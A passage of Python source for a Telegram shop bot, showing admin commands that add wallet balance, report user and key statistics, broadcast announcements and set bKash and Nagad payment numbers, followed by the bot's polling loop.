        _, uid, amt = m.text.split()
        add_balance(int(uid), int(amt), "Admin Add")
        bot.send_message(int(uid), f"✅ ৳{amt} added to your wallet!", parse_mode="Markdown")
        bot.reply_to(m, f"✅ Added ৳{amt} to `{uid}`", parse_mode="Markdown")
    except:
        bot.reply_to(m, "❌ Use: `/addbalance USER_ID AMOUNT`", parse_mode="Markdown")

@bot.message_handler(commands=['stats'])
def stats(m):
    if m.chat.id != ADMIN_ID:
        return
    total_balance = sum(w['balance'] for w in wallet.values())
    total_keys = sum(len(p['keys']) for p in products.values())
    registered = sum(1 for u in users.values() if u.get("registered", False))
    
    text = f"""📊 **STATISTICS**
━━━━━━━━━━━━━━━━━━━━

👥 **Total Users:** {len(users)}
✅ **Registered:** {registered}
🔑 **Total Keys:** {total_keys}
💰 **Total Balance:** ৳{total_balance}
📦 **Products:** {len(products)}

━━━━━━━━━━━━━━━━━━━━"""
    
    bot.send_message(m.chat.id, text, parse_mode="Markdown")

@bot.message_handler(commands=['broadcast'])
def broadcast(m):
    if m.chat.id != ADMIN_ID:
        return
    msg = m.text.replace("/broadcast ", "")
    count = 0
    for uid, u in users.items():
        if u.get("registered", False):
            try:
                bot.send_message(int(uid), f"📢 **ANNOUNCEMENT**\n\n{msg}", parse_mode="Markdown")
                count += 1
                time.sleep(0.05)
            except:
                pass
    bot.reply_to(m, f"✅ Sent to {count} users!")

@bot.message_handler(commands=['setbkash'])
def set_bkash(m):
    if m.chat.id != ADMIN_ID:
        return
    global BKASH_NUMBER
    BKASH_NUMBER = m.text.split()[1]
    bot.reply_to(m, f"✅ BKash set to: `{BKASH_NUMBER}`", parse_mode="Markdown")

@bot.message_handler(commands=['setnagad'])
def set_nagad(m):
    if m.chat.id != ADMIN_ID:
        return
    global NAGAD_NUMBER
    NAGAD_NUMBER = m.text.split()[1]
    bot.reply_to(m, f"✅ Nagad set to: `{NAGAD_NUMBER}`", parse_mode="Markdown")

# ====================== RUN ======================
if __name__ == "__main__":
    print("=" * 60)
    print("🔥 ANTO SHOP ULTIMATE PROFESSIONAL BOT STARTED!")
    print(f"🤖 Bot: @{bot.get_me().username}")
    print(f"👑 Admin ID: {ADMIN_ID}")
    print("=" * 60)
    
    while True:
        try:
            bot.infinity_polling(timeout=60)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)
